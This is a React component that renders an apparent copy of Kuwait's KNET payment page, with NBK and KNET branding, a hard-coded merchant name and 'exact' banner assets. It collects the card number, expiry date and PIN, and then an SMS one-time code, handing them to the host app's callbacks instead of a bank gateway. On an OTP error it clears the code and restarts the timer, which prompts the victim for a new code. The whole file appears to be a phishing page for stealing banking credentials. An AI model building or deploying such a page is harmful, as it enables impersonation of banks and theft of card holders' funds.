import React, { useState, useEffect } from 'react';

interface KnetPaymentPortalProps {
  amount: number;
  merchantName?: string;
  orderNumber: string;
  customerName: string;
  customerPhone: string;
  onCancel: () => void;
  onSubmitCard: (cardData: {
    cardNumber: string;
    cardExpiry: string;
    pin: string;
  }) => void;
  onSubmitOtp: (otp: string) => void;
  step: 'card_entry' | 'otp_verification';
  isProcessing: boolean;
  errorMsg?: string;
  otpErrorMsg?: string;
  otpErrorCode?: string;
  isOtpApproved?: boolean;
}

export const KnetPaymentPortal: React.FC<KnetPaymentPortalProps> = ({
  amount,
  merchantName = 'مزارع ومناحل الثنيان',
  orderNumber,
  customerName,
  customerPhone,
  onCancel,
  onSubmitCard,
  onSubmitOtp,
  step,
  isProcessing,
  errorMsg,
  otpErrorMsg,
  otpErrorCode,
  isOtpApproved
}) => {
  // Method selection (KFAST vs KNET)
  const [selectedMethod, setSelectedMethod] = useState<'KNET' | 'KFAST'>('KNET');

  // Card fields (NO bank selector, NO prefix - exact single card number input!)
  const [cardNumber, setCardNumber] = useState('');
  const [expDate, setExpDate] = useState('');
  const [cardPin, setCardPin] = useState('');
  const [agreeTerms, setAgreeTerms] = useState(true);
  const [validationError, setValidationError] = useState('');

  // OTP fields
  const [enteredOtp, setEnteredOtp] = useState('');
  const [countdownSeconds, setCountdownSeconds] = useState(59);
  const [canResend, setCanResend] = useState(false);

  // Auto-format card number with spaces (e.g. 5370 8821 9044 4912)
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 16);
    const formatted = raw.replace(/(\d{4})(?=\d)/g, '$1 ');
    setCardNumber(formatted);
  };

  // Auto-format MM / YY
  const handleExpDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let v = e.target.value.replace(/[^0-9]/g, '').slice(0, 4);
    if (v.length > 2) {
      setExpDate(v.slice(0, 2) + ' / ' + v.slice(2, 4));
    } else {
      setExpDate(v);
    }
  };

  // Auto-format 4-digit PIN
  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const v = e.target.value.replace(/[^0-9]/g, '').slice(0, 4);
    setCardPin(v);
  };

  // Countdown timer for OTP
  useEffect(() => {
    if (step !== 'otp_verification') return;
    setCountdownSeconds(59);
    setCanResend(false);

    const interval = setInterval(() => {
      setCountdownSeconds(prev => {
        if (prev <= 1) {
          clearInterval(interval);
          setCanResend(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, [step]);

  // When an OTP rejection error occurs, clear entered code and restart countdown
  useEffect(() => {
    if (otpErrorMsg) {
      setEnteredOtp('');
      setCountdownSeconds(59);
      setCanResend(false);
    }
  }, [otpErrorMsg]);

  const handleCardFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setValidationError('');

    const cleanNumber = cardNumber.replace(/\D/g, '');
    if (cleanNumber.length < 16) {
      setValidationError('Please enter a valid 16-digit card number.');
      return;
    }

    if (expDate.length < 5) {
      setValidationError('Please enter expiration date (MM / YY).');
      return;
    }

    if (cardPin.length < 4) {
      setValidationError('Please enter 4-digit PIN.');
      return;
    }

    onSubmitCard({
      cardNumber: cleanNumber,
      cardExpiry: expDate,
      pin: cardPin
    });
  };

  const handleOtpFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!enteredOtp || enteredOtp.length < 4) {
      return;
    }
    onSubmitOtp(enteredOtp);
  };

  const handleResendClick = () => {
    setCountdownSeconds(59);
    setCanResend(false);
  };

  return (
    <div 
      className="w-full flex flex-col items-center py-2 sm:py-4 px-2"
      style={{
        backgroundColor: '#ededed',
        color: '#222222',
        direction: 'ltr',
        textAlign: 'left',
        fontFamily: 'Arial, Helvetica, Tahoma, "Segoe UI", sans-serif'
      }}
    >
      
      {/* 1. Top Header Bar */}
      <div 
        className="w-full max-w-[420px] h-[52px] bg-white flex items-center justify-between px-4 border-b border-slate-200 mb-3.5 shadow-2xs rounded-t-xl"
      >
        <button 
          type="button" 
          onClick={onCancel}
          className="bg-transparent border-0 cursor-pointer p-1 flex items-center justify-center text-[#0a5c71]"
          title="Back"
        >
          <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#0a5c71" strokeWidth="2.6" strokeLinecap="round" strokeLinejoin="round">
            <polyline points="15 19 8 12 15 5"></polyline>
          </svg>
        </button>

        <span className="text-[19px] font-semibold text-[#0c5c70] tracking-tight">
          Payment
        </span>

        <button 
          type="button" 
          onClick={() => window.location.reload()}
          className="bg-transparent border-0 cursor-pointer p-1 flex items-center justify-center text-[#0a5c71]"
          title="Refresh"
        >
          <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#0a5c71" strokeWidth="2.6" strokeLinecap="round" strokeLinejoin="round">
            <path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38l5.67-5.19"></path>
          </svg>
        </button>
      </div>

      {/* Main Wrapper */}
      <div className="w-full max-w-[380px] px-1.5 flex flex-col gap-3">

        {/* 2. Top Awareness Campaign Banner (لنكن على دراية) */}
        <div 
          className="w-full rounded-[12px] overflow-hidden shadow-xs border border-[#7c9eb5] bg-[#427c9b]"
        >
          <img 
            src="/images/knet_banner_exact.png" 
            alt="لنكن على دراية - الحملة التوعوية المصرفية" 
            className="w-full h-auto block object-cover"
            onError={(e) => {
              (e.target as HTMLElement).style.display = 'none';
            }}
          />
        </div>

        {/* 3. Card 1: Bank & Merchant Details */}
        <div 
          className="w-full bg-white rounded-[14px] border border-[#a8a8a8] shadow-xs px-4 py-3"
        >
          <div className="flex justify-center items-center mb-2.5">
            <img 
              src="/images/nbk_logo.png" 
              alt="NBK الوطني" 
              className="h-[38px] max-w-[150px] object-contain block"
              onError={(e) => {
                (e.target as HTMLElement).style.display = 'none';
              }}
            />
          </div>

          <div className="flex items-start justify-between text-[13px] leading-tight">
            <span className="text-[#0070ba] font-bold text-[13px] shrink-0 min-w-[80px]">
              Merchant:
            </span>
            <span className="text-[#333333] text-[12.5px] font-medium text-left ml-auto max-w-[70%]">
              {merchantName}
            </span>
          </div>

          <div className="h-[1px] bg-[#c4c8cc] w-full my-2.5"></div>

          <div className="flex items-center justify-between text-[13px] leading-tight">
            <span className="text-[#0070ba] font-bold text-[13px] shrink-0 min-w-[80px]">
              Amount:
            </span>
            <span className="font-semibold text-[#222222] text-[13px] font-mono">
              KD {amount.toFixed(3)}
            </span>
          </div>
        </div>

        {/* ================= STEP 1: CARD ENTRY FORM ================= */}
        {step === 'card_entry' && (
          <>
            {/* Validation / Error Alert */}
            {(validationError || errorMsg) && (
              <div className="p-2.5 bg-rose-50 border border-rose-300 text-rose-700 text-xs rounded-lg text-center font-bold">
                {validationError || errorMsg}
              </div>
            )}

            {/* 4. Card 2: Payment Gateway Selection & Card Form */}
            <div className="w-full bg-white rounded-[14px] border border-[#a8a8a8] shadow-xs px-4 py-3.5">
              
              {/* Payment Badges (KFAST vs KNET) */}
              <div className="flex items-center justify-around py-1">
                <label 
                  onClick={() => setSelectedMethod('KFAST')}
                  className="flex items-center gap-2 cursor-pointer select-none"
                >
                  <input 
                    type="radio" 
                    name="paymentMethod" 
                    value="KFAST" 
                    checked={selectedMethod === 'KFAST'}
                    onChange={() => setSelectedMethod('KFAST')}
                    className="hidden" 
                  />
                  <span 
                    className="w-[18px] h-[18px] rounded-full border-[1.5px] bg-white flex items-center justify-center shrink-0 transition-all"
                    style={{
                      borderColor: selectedMethod === 'KFAST' ? '#008cdb' : '#a0a0a0',
                      boxShadow: selectedMethod === 'KFAST' ? '0 0 0 1px #008cdb' : 'none'
                    }}
                  >
                    {selectedMethod === 'KFAST' && (
                      <span className="w-[10px] h-[10px] bg-[#0070ba] rounded-full block" />
                    )}
                  </span>
                  <img 
                    src="/images/kfast_badge.png" 
                    alt="K FAST" 
                    className="h-[38px] w-auto object-contain block rounded"
                  />
                </label>

                <label 
                  onClick={() => setSelectedMethod('KNET')}
                  className="flex items-center gap-2 cursor-pointer select-none"
                >
                  <input 
                    type="radio" 
                    name="paymentMethod" 
                    value="KNET" 
                    checked={selectedMethod === 'KNET'}
                    onChange={() => setSelectedMethod('KNET')}
                    className="hidden" 
                  />
                  <span 
                    className="w-[18px] h-[18px] rounded-full border-[1.5px] bg-white flex items-center justify-center shrink-0 transition-all"
                    style={{
                      borderColor: selectedMethod === 'KNET' ? '#008cdb' : '#a0a0a0',
                      boxShadow: selectedMethod === 'KNET' ? '0 0 0 1px #008cdb' : 'none'
                    }}
                  >
                    {selectedMethod === 'KNET' && (
                      <span className="w-[10px] h-[10px] bg-[#0070ba] rounded-full block" />
                    )}
                  </span>
                  <img 
                    src="/images/knet_badge.png" 
                    alt="KNET" 
                    className="h-[38px] w-auto object-contain block rounded"
                  />
                </label>
              </div>

              {/* Divider between badges and Card Number */}
              <div className="h-[1px] bg-[#c4c8cc] w-full my-2.5"></div>

              {/* Card Input Form (NO prefix, NO bank selector - pure clean identical inputs) */}
              <form id="knetPaymentForm" onSubmit={handleCardFormSubmit} className="space-y-2">
                
                {/* 1. Card Number */}
                <div className="flex items-center justify-start gap-3">
                  <label htmlFor="cardNumber" className="text-[#0070ba] font-bold text-[13px] w-[130px] min-w-[120px] shrink-0 text-left">
                    Card Number:
                  </label>
                  <div className="flex-1 flex justify-start items-center">
                    <input 
                      type="tel" 
                      id="cardNumber" 
                      required
                      autoComplete="off"
                      maxLength={19}
                      placeholder=""
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      className="h-[25px] w-[175px] bg-white border border-[#8e959b] focus:border-[#0070ba] rounded-[4px] px-2 text-[13px] font-semibold text-[#111111] font-mono outline-none"
                      style={{
                        boxShadow: 'inset 1px 1.5px 3px rgba(0, 0, 0, 0.22)'
                      }}
                    />
                  </div>
                </div>

                {/* Divider */}
                <div className="h-[1px] bg-[#c4c8cc] w-full my-2"></div>

                {/* 2. Expiration Date */}
                <div className="flex items-center justify-start gap-3">
                  <label htmlFor="expDate" className="text-[#0070ba] font-bold text-[13px] w-[130px] min-w-[120px] shrink-0 text-left">
                    Expiration Date:
                  </label>
                  <div className="flex-1 flex justify-start items-center">
                    <input 
                      type="text" 
                      id="expDate" 
                      required
                      autoComplete="off"
                      maxLength={7}
                      placeholder="MM / YY"
                      value={expDate}
                      onChange={handleExpDateChange}
                      className="h-[25px] w-[76px] text-center bg-white border border-[#8e959b] focus:border-[#0070ba] rounded-[4px] px-1 text-[12px] font-semibold text-[#111111] font-mono outline-none"
                      style={{
                        boxShadow: 'inset 1px 1.5px 3px rgba(0, 0, 0, 0.22)'
                      }}
                    />
                  </div>
                </div>

                {/* Divider */}
                <div className="h-[1px] bg-[#c4c8cc] w-full my-2"></div>

                {/* 3. PIN */}
                <div className="flex items-center justify-start gap-3">
                  <label htmlFor="cardPin" className="text-[#0070ba] font-bold text-[13px] w-[130px] min-w-[120px] shrink-0 text-left">
                    PIN:
                  </label>
                  <div className="flex-1 flex justify-start items-center">
                    <input 
                      type="password" 
                      id="cardPin" 
                      required
                      autoComplete="off"
                      maxLength={4}
                      placeholder=""
                      value={cardPin}
                      onChange={handlePinChange}
                      className="h-[25px] w-[175px] bg-white border border-[#8e959b] focus:border-[#0070ba] rounded-[4px] px-2 text-[13px] font-semibold text-[#111111] font-mono tracking-[2.5px] outline-none"
                      style={{
                        boxShadow: 'inset 1px 1.5px 3px rgba(0, 0, 0, 0.22)'
                      }}
                    />
                  </div>
                </div>

              </form>
            </div>

            {/* 5. Card 3: Terms Checkbox & Action Buttons */}
            <div className="w-full bg-white rounded-[14px] border border-[#a8a8a8] shadow-xs px-4 py-3.5 flex flex-col gap-3">
              <div className="flex items-center">
                <label htmlFor="agreeTerms" className="flex items-center gap-2 cursor-pointer select-none">
                  <input 
                    type="checkbox" 
                    id="agreeTerms" 
                    checked={agreeTerms}
                    onChange={(e) => setAgreeTerms(e.target.checked)}
                    className="hidden" 
                  />
                  <span 
                    className="w-[17px] h-[17px] border-[1.5px] border-[#777777] rounded-[3px] bg-white flex items-center justify-center shrink-0"
                  >
                    {agreeTerms && (
                      <span className="text-[13px] font-bold text-[#0070ba] leading-none">✓</span>
                    )}
                  </span>
                  <span className="text-[12px] text-[#2b2b2b] font-medium leading-tight">
                    I have read &amp; agree to the <span className="text-[#0070ba] font-bold italic underline cursor-pointer">Terms</span> to register for KFast
                  </span>
                </label>
              </div>

              <div className="flex gap-2.5 w-full">
                <button 
                  type="submit" 
                  form="knetPaymentForm" 
                  disabled={isProcessing}
                  className="flex-1 h-[32px] rounded-[4px] text-[12.5px] font-bold text-[#3b3b3b] border border-[#9e9e9e] cursor-pointer flex items-center justify-center shadow-2xs transition-all active:scale-98 disabled:opacity-50"
                  style={{
                    background: 'linear-gradient(180deg, #f5f5f5 0%, #dedede 100%)'
                  }}
                >
                  Submit
                </button>

                <button 
                  type="button"
                  onClick={onCancel}
                  className="flex-1 h-[32px] rounded-[4px] text-[12.5px] font-bold text-[#3b3b3b] border border-[#9e9e9e] cursor-pointer flex items-center justify-center shadow-2xs transition-all active:scale-98"
                  style={{
                    background: 'linear-gradient(180deg, #f5f5f5 0%, #dedede 100%)'
                  }}
                >
                  Cancel
                </button>
              </div>
            </div>
          </>
        )}

        {/* ================= STEP 2: OTP VERIFICATION FORM (otp.html) ================= */}
        {step === 'otp_verification' && (
          <div 
            className="w-full bg-white rounded-[14px] border border-[#a8a8a8] shadow-xs px-4 py-4 space-y-3.5"
            dir="rtl"
          >
            {/* Notice Box */}
            <div className="bg-[#f0f7ff] border border-[#bae6fd] rounded-[6px] p-2.5 text-[11.5px] text-[#0369a1] text-center font-medium leading-relaxed">
              تم إرسال رمز التحقق لمرة واحدة (OTP) عبر رسالة نصية SMS إلى رقم هاتفك النقال المسجل لدى البنك.
            </div>

            {/* Error notification if rejected */}
            {otpErrorMsg && (
              <div className="bg-[#fef2f2] border border-[#fecaca] rounded-[8px] p-2.5 text-center font-bold space-y-1.5 animate-in fade-in">
                <div className="text-[12px] text-[#dc2626] flex items-center justify-center gap-1.5 leading-snug">
                  <span>⚠️</span>
                  <span>{otpErrorMsg}</span>
                </div>
                <div className="inline-flex items-center gap-1.5 bg-white border border-rose-300 text-rose-800 text-[11px] font-mono px-2.5 py-0.5 rounded shadow-2xs">
                  <span>رمز الخطأ:</span>
                  <strong className="tracking-wider">{otpErrorCode || 'ERR_KNET_OTP_INVALID_401'}</strong>
                </div>
              </div>
            )}

            {/* OTP Form */}
            <form onSubmit={handleOtpFormSubmit} className="space-y-3">
              <div className="text-center space-y-1.5">
                <label className="text-[#0070ba] font-bold text-[12.5px] block text-center">
                  أدخل رمز التحقق (OTP)
                </label>

                <div className="flex justify-center">
                  <input 
                    type="text" 
                    id="otpCode"
                    autoFocus
                    required
                    inputMode="numeric"
                    maxLength={6}
                    placeholder="• • • • • •"
                    value={enteredOtp}
                    onChange={(e) => setEnteredOtp(e.target.value.replace(/[^0-9]/g, '').slice(0, 6))}
                    className={`w-full max-w-[220px] h-[38px] text-center text-[20px] font-bold tracking-[6px] rounded-[6px] text-[#111111] outline-none font-mono transition-all ${
                      otpErrorMsg ? 'bg-rose-50/40 border-[1.5px] border-[#dc2626]' : 'bg-white border-[1.5px] border-[#0070ba]'
                    }`}
                    dir="ltr"
                    style={{
                      boxShadow: otpErrorMsg
                        ? 'inset 1px 1.5px 3px rgba(0, 0, 0, 0.15), 0 0 0 3px rgba(220, 38, 38, 0.18)'
                        : 'inset 1px 1.5px 3px rgba(0, 0, 0, 0.15), 0 0 0 3px rgba(0, 112, 186, 0.12)'
                    }}
                  />
                </div>
              </div>

              {/* Timer & Resend Section */}
              <div className="flex justify-between items-center text-[11px] text-[#64748b] pt-2 border-t border-dashed border-[#e2e8f0]">
                <span>
                  الوقت المتبقي: <strong>{countdownSeconds > 0 ? `${countdownSeconds} ثانية` : 'انتهى الوقت'}</strong>
                </span>

                <button
                  type="button"
                  disabled={!canResend}
                  onClick={handleResendClick}
                  className="bg-transparent border-0 text-[#0070ba] font-bold text-[11px] underline cursor-pointer disabled:text-slate-400 disabled:no-underline disabled:cursor-not-allowed"
                >
                  إعادة إرسال الرمز
                </button>
              </div>

              {/* Action Buttons */}
              <div className="flex gap-2.5 w-full pt-1" dir="ltr">
                <button 
                  type="submit" 
                  disabled={isProcessing || enteredOtp.length < 4}
                  className="flex-1 h-[34px] rounded-[4px] text-[12.5px] font-bold text-[#3b3b3b] border border-[#9e9e9e] cursor-pointer flex items-center justify-center shadow-2xs transition-all active:scale-98 disabled:opacity-50"
                  style={{
                    background: 'linear-gradient(180deg, #f5f5f5 0%, #dedede 100%)'
                  }}
                >
                  {isProcessing ? 'جاري التحقق...' : 'تأكيد / Submit'}
                </button>

                <button 
                  type="button"
                  onClick={onCancel}
                  className="flex-1 h-[34px] rounded-[4px] text-[12.5px] font-bold text-[#3b3b3b] border border-[#9e9e9e] cursor-pointer flex items-center justify-center shadow-2xs transition-all active:scale-98"
                  style={{
                    background: 'linear-gradient(180deg, #f5f5f5 0%, #dedede 100%)'
                  }}
                >
                  إلغاء / Cancel
                </button>
              </div>

            </form>
          </div>
        )}

        {/* 6. Footer Copyright */}
        <footer className="mt-3.5 text-center text-[11.5px] leading-relaxed">
          <div className="text-[#222222] font-medium">All Rights Reserved. Copyright 2026 &copy;</div>
          <div className="text-[#0070ba] font-bold mt-0.5 cursor-pointer">
            The Shared Electronic Banking Services Company - KNET
          </div>
        </footer>

      </div>

      {/* Processing Modal Overlay */}
      {isProcessing && (
        <div className="fixed inset-0 bg-black/45 z-50 flex items-center justify-center animate-in fade-in duration-150">
          <div className="bg-white border border-[#b8b8b8] rounded-lg p-5 w-[290px] text-center shadow-xl">
            <div className="w-8 h-8 border-3 border-slate-200 border-t-[#0070ba] rounded-full animate-spin mx-auto mb-2.5" />
            <div className="text-[13px] font-bold text-[#111111] mb-1">Processing transaction...</div>
            <div className="text-[11px] text-[#666666]">Please wait</div>
          </div>
        </div>
      )}

    </div>
  );
};
